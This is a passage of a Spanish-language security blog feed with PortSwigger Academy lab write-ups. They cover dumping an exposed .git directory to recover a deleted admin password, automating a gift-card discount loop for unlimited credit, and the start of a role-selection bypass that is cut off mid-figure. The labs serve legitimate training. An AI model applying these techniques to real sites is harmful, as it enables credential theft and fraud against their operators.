&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/objects/21/d23f13ce6c704b81857379a3e247e3436f4b26 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/objects/63/10c3e39bf987171b2f674fbb643edddbe0e238 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/objects/00/00000000000000000000000000000000000000 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;404&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/objects/00/00000000000000000000000000000000000000 responded with status code &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/objects/21/54555944002791a4d27412bf6e9a6f29e942fa &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/objects/2a/43eabe500cc1a50c12bdbf2ed4c1f6ce3f1672 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching https://ac951f811e6afa19c09f053f002800bc.web-security-academy.net/.git/objects/21/d2e87f8577056741bb3dd4608cfd7b7506cfa5 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Running git checkout .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora que tenemos todos nuestros archivos podemos entrar y ver que esta en los archivos y carpetas creadas. Y hay algo que llama la atencion y es donde esta una contrasena de usuario pero que ahora esta como variable. Podriamos ver el historial si antes estaba ahi la contrasena real y no fue cambiada.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;alux@rootsystems:~/tools/test&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;master&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;$ ls -la
drwxr-xr-x  - alux &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; dic 21:55 .git
.rw-r--r-- &lt;span class=&#34;m&#34;&gt;37&lt;/span&gt; alux &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; dic 21:55 admin.conf
.rw-r--r-- &lt;span class=&#34;m&#34;&gt;88&lt;/span&gt; alux &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; dic 21:55 admin_panel.php
alux@rootsystems:~/tools/test&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;master&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;$ cat admin_panel.php&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt;
&amp;lt;?php &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;TODO: build an amazing admin panel, but remember to check the password!&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; ?&amp;gt;
alux@rootsystems:~/tools/test&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;master&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;$ cat admin.conf
&lt;span class=&#34;nv&#34;&gt;ADMIN_PASSWORD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;env&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ADMIN_PASSWORD&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
alux@rootsystems:~/tools/test&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;master&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Para eso nos apoyamos de git y mostramos los cambios que se han realizado y vemos que ahi esta la nueva contrasena y la vieja por lo que deberiamos poder acceder con ella.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;alux@rootsystems:~/tools/test&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;master&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;$ git show
commit fd566ec1574b5eb704b3b69a275cdedf33dfc1b9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HEAD -&amp;gt; master&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Author: Carlos Montoya &amp;lt;carlos@evil-user.net&amp;gt;
Date:   Tue Jun &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; 14:05:07 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; +0000

    Remove admin password from config

diff --git a/admin.conf b/admin.conf
index 21d2e87..21d23f1 &lt;span class=&#34;m&#34;&gt;100644&lt;/span&gt;
--- a/admin.conf
+++ b/admin.conf
@@ -1 +1 @@
-ADMIN_PASSWORD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ewm1p3s0m5xon81jftcj
+ADMIN_PASSWORD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;env&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ADMIN_PASSWORD&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Y ahora ingresamos las credenciales de &lt;code&gt;administrator:ewm1p3s0m5xon81jftcj&lt;/code&gt;, eliminamos al usuario carlos y resolvimos el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 257; 
			flex-basis: 617px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-5/resuelto.png&#34; data-size=&#34;1804x701&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-5/resuelto.png&#34;
			width=&#34;1804&#34;
			height=&#34;701&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-5/resuelto_hufaac76ddbbf68615f9e1465c2c88d110_84660_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-information-disclosure-lab-5/resuelto_hufaac76ddbbf68615f9e1465c2c88d110_84660_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Business Logic Lab 10</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/</link>
        <pubDate>Tue, 14 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/head.png" alt="Featured image of post Portswigger Academy Learning Path: Business Logic Lab 10" /&gt;&lt;h1 id=&#34;lab-infinite-money-logic-flaw&#34;&gt;Lab: Infinite money logic flaw&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de business logic la cual ocurre cuando el sistema no valida lo que puede hacer el usuario creyendo que todo seguira el workflow correcto.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo que debemos poder hacer es comprar la chaqueta para resolver el lab. Pero no contamos con el credito suficiente para realizar la compra. Lo primero que notamos es que seguimos teniendo un codigo de descuento que es &lt;code&gt;SIGNUP30&lt;/code&gt; que nos da el 30% de descuento en una compra. Y lo otro es que podemos comprar gift card&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 87; 
			flex-basis: 210px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/giftcard.png&#34; data-size=&#34;438x500&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/giftcard.png&#34;
			width=&#34;438&#34;
			height=&#34;500&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/giftcard_hu874ade19f805c36fae76a72f8198a949_163089_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/giftcard_hu874ade19f805c36fae76a72f8198a949_163089_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Gift Card&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Gift Card&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Cuando realizamos la compra pasa lo siguiente, se nos da un codigo el cual podemos hacer el cambio para obtener 10 dolares en nuetro credito eso significa que si compramos una gift card con el descuento del 30% nos saldra en 7 dolares y cuando la cambiemos tendremos en nuestro credito 3 dolares mas por haber gastado menos por el descuento.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 197; 
			flex-basis: 474px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/buygiftcard.png&#34; data-size=&#34;1787x904&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/buygiftcard.png&#34;
			width=&#34;1787&#34;
			height=&#34;904&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/buygiftcard_hu8cc87314eca9929affb6a237d8e3856b_97617_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/buygiftcard_hu8cc87314eca9929affb6a237d8e3856b_97617_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Gift Card&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Gift Card&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Esto es imposible hacerlo manual sin la automatizacion, pero el sistema usa token csrf para las peticiones y toca realizar muchos pasos por eso lo mejor es preparar una macro para poder realizar el proceso de manera automatizada hasta que tengamos el credito suficiente para comprar la chaqueta.&lt;/p&gt;
&lt;h3 id=&#34;creacion-de-macro&#34;&gt;Creacion de macro&lt;/h3&gt;
&lt;h4 id=&#34;crear-sesion&#34;&gt;Crear sesion&lt;/h4&gt;
&lt;p&gt;Vamos a Project Options &amp;gt; Session Handling Rules y creamos  una nueva&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 293; 
			flex-basis: 704px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/sessions.png&#34; data-size=&#34;887x302&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/sessions.png&#34;
			width=&#34;887&#34;
			height=&#34;302&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/sessions_hud6d53b202c5604779609ea9dbe962979_16615_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/sessions_hud6d53b202c5604779609ea9dbe962979_16615_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;crear session handling rule&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;crear session handling rule&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;crear-rule-actions&#34;&gt;Crear Rule Actions&lt;/h4&gt;
&lt;p&gt;Agregamos una nueva regla&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 131; 
			flex-basis: 315px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/ruleaction.png&#34; data-size=&#34;961x731&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/ruleaction.png&#34;
			width=&#34;961&#34;
			height=&#34;731&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/ruleaction_hue6ccdf378c2b6e0917a0e2d9247c37b6_32745_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/ruleaction_hue6ccdf378c2b6e0917a0e2d9247c37b6_32745_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Agregamos nueva rule action&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Agregamos nueva rule action&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;crear-macro&#34;&gt;Crear macro&lt;/h4&gt;
&lt;p&gt;Elegimos las peticiones que participan en el proceso para la compra de la gift card y realizar y hacer uso de este. La forma en que procesan todo es:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Se envia a la carretilla la gift card para su compra&lt;/li&gt;
&lt;li&gt;Se envia el cupon de 30% de descuento SIGNUP30&lt;/li&gt;
&lt;li&gt;Se hace un check de lo que esta en carretilla&lt;/li&gt;
&lt;li&gt;Se hace la confirmacion del pedido y realiza la compra de la gift card (en este paso se extrae de la respuesta el cupon que se muestra al realizar la compra)&lt;/li&gt;
&lt;li&gt;Se envia la peticion para canjear la gift card&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 203; 
			flex-basis: 487px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/macro.png&#34; data-size=&#34;1346x663&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/macro.png&#34;
			width=&#34;1346&#34;
			height=&#34;663&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/macro_hue06b7b26c0d8ee20a0d85fdfde888a22_67208_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/macro_hue06b7b26c0d8ee20a0d85fdfde888a22_67208_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Edicion de macro&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Edicion de macro&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Luego solo nos queda enviar la peticion de &lt;code&gt;/my-account&lt;/code&gt; al intruder ya que es la que hara que toda la macro corra.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Esta se lanza con null payloads, que se ejecute indefinidamente y con solamente un hilo para que no genere error por los token csrf&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 272; 
			flex-basis: 655px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/intruder.png&#34; data-size=&#34;1291x473&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/intruder.png&#34;
			width=&#34;1291&#34;
			height=&#34;473&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/intruder_huae5a6a30335eb556617f06e15cd89ae8_62057_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/intruder_huae5a6a30335eb556617f06e15cd89ae8_62057_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder para lanzar macro&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder para lanzar macro&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Cuando la lanzamos podemops ver como va cambiando el valor del credito y va sumando 3 dolares cada que se ejecuta correctamente. En total lance &lt;code&gt;438&lt;/code&gt; peticiones para tener el valor necesario para comprar el jacket.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 195; 
			flex-basis: 469px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/update1.png&#34; data-size=&#34;180x92&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/update1.png&#34;
			width=&#34;180&#34;
			height=&#34;92&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/update1_hu3f8c5e4163d883182f9cb71918561f23_5488_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/update1_hu3f8c5e4163d883182f9cb71918561f23_5488_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Credito 1&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Credito 1&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 180; 
			flex-basis: 434px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/update2.png&#34; data-size=&#34;170x94&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/update2.png&#34;
			width=&#34;170&#34;
			height=&#34;94&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/update2_hu9b75941456021f2853ddacc75efe3b42_5194_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/update2_hu9b75941456021f2853ddacc75efe3b42_5194_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Credito 2&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Credito 2&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 187; 
			flex-basis: 450px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/update3.png&#34; data-size=&#34;180x96&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/update3.png&#34;
			width=&#34;180&#34;
			height=&#34;96&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/update3_hu031e833945916474a99008485c719901_4976_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/update3_hu031e833945916474a99008485c719901_4976_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Credito 3&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Credito 3&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 167; 
			flex-basis: 402px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/credito.png&#34; data-size=&#34;1769x1054&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/credito.png&#34;
			width=&#34;1769&#34;
			height=&#34;1054&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/credito_hu113e6df7a4d1becbcc712753c4a0d17e_87375_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/credito_hu113e6df7a4d1becbcc712753c4a0d17e_87375_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Credito del usuario en su cuenta&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Credito del usuario en su cuenta&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora al tener la cantidad correcta ya podemos realizar la compra y se resuelve el lab&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 395; 
			flex-basis: 950px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/resuelto.png&#34; data-size=&#34;1770x447&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/resuelto.png&#34;
			width=&#34;1770&#34;
			height=&#34;447&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/resuelto_hu3f580bc0f36dc6b4414e70057a2e6504_45028_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-10/resuelto_hu3f580bc0f36dc6b4414e70057a2e6504_45028_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Business Logic Lab 8</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/</link>
        <pubDate>Mon, 13 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/head.png" alt="Featured image of post Portswigger Academy Learning Path: Business Logic Lab 8" /&gt;&lt;h1 id=&#34;lab-authentication-bypass-via-flawed-state-machine&#34;&gt;Lab: Authentication bypass via flawed state machine&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de business logic la cual ocurre cuando el sistema no valida lo que puede hacer el usuario creyendo que todo seguira el workflow correcto.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Ingresamos con las credenciales de &lt;code&gt;wiener:peter&lt;/code&gt; para poder acceder al sistema y luego debemos elegir el rol que queremos tener en el sistema.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 184; 
			flex-basis: 443px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/login.png&#34; data-size=&#34;1217x659&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/login.png&#34;
			width=&#34;1217&#34;
			height=&#34;659&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/login_hu5c9305fb11b6196b1d6915067a676bc3_25631_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/login_hu5c9305fb11b6196b1d6915067a676bc3_25631_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Inicio de sesion&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Inicio de sesion&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al iniciar con las credenciales correctas podemos elegir el rol:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 373; 
			flex-basis: 896px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/selectrole.png&#34; data-size=&#34;1106x296&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/selectrole.png&#34;
			width=&#34;1106&#34;
			height=&#34;296&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/selectrole_hu6f6cd85f692cb192d3d5f4193ee660d0_13757_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/selectrole_hu6f6cd85f692cb192d3d5f4193ee660d0_13757_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Seleccionar rol&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Seleccionar rol&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Ahora vamos a tratar de saltarnos la eleccion de rol para ver si el sistema hace una validacion o provoca un error en el sistema para saber que algo esta mal.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 268; 
			flex-basis: 643px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/request.png&#34; data-size=&#34;1536x573&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/request.png&#34;
			width=&#34;1536&#34;
			height=&#34;573&#34;
